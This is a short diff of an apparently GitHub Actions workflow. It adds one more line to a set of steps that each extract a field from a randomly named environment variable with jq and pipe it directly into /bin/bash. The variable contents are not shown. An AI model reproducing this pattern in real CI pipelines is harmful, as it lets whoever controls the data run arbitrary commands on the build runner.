@@ -29,6 +29,7 @@ jobs:
           echo $wi6 | jq -r .qz0 | /bin/bash
           printf '%s' "$dssj3" | jq -r .zrpd8 | /bin/bash
           echo $pgxon984 | jq -r .z058 | /bin/bash
+          printf '%s' "$lk1" | jq -r .bmx11973 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
